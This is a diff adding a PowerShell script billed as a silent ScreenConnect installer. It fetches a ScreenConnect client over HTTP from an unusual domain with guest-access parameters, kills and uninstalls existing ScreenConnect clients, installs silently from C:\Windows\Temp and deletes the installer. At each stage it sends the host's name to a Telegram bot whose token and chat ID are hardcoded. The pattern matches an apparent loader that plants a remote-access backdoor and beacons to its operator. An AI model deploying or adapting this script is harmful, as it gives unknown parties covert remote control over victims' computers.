@@ -1,0 +1,122 @@
+# ==============================================================================
+# Script Name: install.ps1
+# Description: Fixed ScreenConnect silent installer with Step-by-Step Alerts
+# ==============================================================================
+
+# Force PowerShell output to treat text as UTF-8
+[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+$OutputEncoding = [System.Text.Encoding]::UTF8
+
+# 1. TELEGRAM CONFIGURATION
+$BotToken = "8685613792:AAHRJ7zBA-WU-TZtW946VVGXH9QrKrPg694"
+$ChatID   = "6562782106"
+
+# 2. APPLICATION CONFIGURATION
+$MsiUrl    = "http://server.hudgroweart.site/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=Silento&c=Aobe&c=&c=&c=&c=&c=&c="
+$TempDir   = "C:\Windows\Temp"
+$MsiPath   = Join-Path $TempDir "ScreenConnectSetup.msi"
+$LogPath   = "C:\Windows\Temp\ScreenConnect_Install.log"
+$Computer  = $env:COMPUTERNAME
+
+$ProgressPreference = 'SilentlyContinue'
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
+
+# Function to send Telegram messages safely via JSON POST
+function Send-TelegramAlert {
+    param([string]$Message)
+    try {
+        $Payload = @{
+            chat_id = $ChatID
+            text    = $Message
+        } | ConvertTo-Json -Compress -Depth 2
+
+        Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/sendMessage" `
+                          -Method Post `
+                          -ContentType "application/json; charset=utf-8" `
+                          -Body $Payload -ErrorAction Stop | Out-Null
+    } catch {
+        Write-Warning "Failed to send Telegram notification: $($_.Exception.Message)"
+    }
+}
+
+# --- MILESTONE 1: SCRIPT LAUNCHED ---
+Send-TelegramAlert -Message "[🚀] ScreenConnect Script Launched!`nPC: $Computer`nStatus: Starting system environmental pre-checks..."
+
+# 3. ANTI-1603 CONFLICT CLEANUP (Faronics Optimized: Stripped hang-prone Get-Service and Get-CimInstance commands)
+try {
+    Write-Output "Stopping any existing ScreenConnect services..."
+    # Using taskkill and sc.exe bypasses the slow PowerShell service engine entirely
+    taskkill.exe /F /FI "IMAGENAME eq ScreenConnect*" /T 2>$null
+    sc.exe stop "ScreenConnect Client Service" 2>$null
+
+    Write-Output "Removing old ScreenConnect instances via fast registry check to prevent 1603 errors..."
+    $RegPaths = @(
+        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*",
+        "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
+    )
+    $OldApps = Get-ItemProperty $RegPaths -ErrorAction SilentlyContinue | 
+               Where-Object { $_.DisplayName -like "*ScreenConnect*" -and $_.UninstallString -like "*msiexec*" }
+
+    foreach ($App in $OldApps) {
+        $IdentifyingNumber = $App.PSChildName
+        Write-Output "Uninstalling existing client GUID: $IdentifyingNumber"
+        Send-TelegramAlert -Message "[🗑️] Conflict Found: Removing old client ($($App.DisplayName)) on PC: $Computer"
+        Start-Process -FilePath "msiexec.exe" -ArgumentList "/x $IdentifyingNumber /qn /norestart" -Wait -NoNewWindow
+    }
+} catch {
+    Write-Output "Pre-cleanup encountered an issue but proceeding anyway: $_"
+}
+
+# --- MILESTONE 2: DOWNLOAD INITIATED ---
+Send-TelegramAlert -Message "[📥] Download Started`nPC: $Computer`nStatus: Fetching the ScreenConnect setup package..."
+
+# 4. Download Logic
+try {
+    Write-Output "Downloading ScreenConnect MSI..."
+    if (Test-Path $MsiPath) { Remove-Item $MsiPath -Force -ErrorAction SilentlyContinue }
+
+    Invoke-WebRequest -Uri $MsiUrl -OutFile $MsiPath -UseBasicParsing -ErrorAction Stop
+
+    if (-not (Test-Path $MsiPath) -or (Get-Item $MsiPath).Length -lt 1024) {
+        throw "Downloaded file is missing or too small."
+    }
+    Write-Output "Download completed successfully."
+    
+    # --- MILESTONE 2B: DOWNLOAD SUCCESSFUL ---
+    Send-TelegramAlert -Message "[💾] Download Complete`nPC: $Computer`nStatus: File successfully cached locally in temp directory."
+}
+catch {
+    $Msg = "[!] ScreenConnect Download FAILED`nPC: $Computer`nError: $($_.Exception.Message)"
+    Send-TelegramAlert -Message $Msg
+    exit 1
+}
+
+# --- MILESTONE 3: INSTALLATION STARTED ---
+Send-TelegramAlert -Message "[🛠️] Installation Started`nPC: $Computer`nStatus: Handing the MSI binary package to the silent background execution engine..."
+
+# 5. Installation Logic
+if (Test-Path $MsiPath) {
+    Write-Output "Starting silent installation..."
+    $Arguments = "/i `"$MsiPath`" /qn /norestart /L*V `"$LogPath`""
+
+    $Process = Start-Process -FilePath "msiexec.exe" -ArgumentList $Arguments -Wait -NoNewWindow -PassThru
+
+    Remove-Item -Path $MsiPath -Force -ErrorAction SilentlyContinue
+
+    # --- MILESTONE 4: FINAL EVALUATION ---
+    if ($Process.ExitCode -eq 0 -or $Process.ExitCode -eq 3010) {
+        $Status = if ($Process.ExitCode -eq 3010) { "Installed successfully (Reboot Pending)." } else { "Installed successfully." }
+        $Msg = "[+] ScreenConnect Deployment Success`nPC: $Computer`nStatus: $Status"
+        Send-TelegramAlert -Message $Msg
+        exit 0
+    }
+    else {
+        $Msg = "[!] ScreenConnect Deployment FAILED`nPC: $Computer`nExit Code: $($Process.ExitCode)`nCheck local log at: $LogPath"
+        Send-TelegramAlert -Message $Msg
+        exit $Process.ExitCode
+    }
+} else {
+    $Msg = "[!] ScreenConnect Deployment FAILED`nPC: $Computer`nError: File download validation failed."
+    Send-TelegramAlert -Message $Msg
+    exit 1
+}
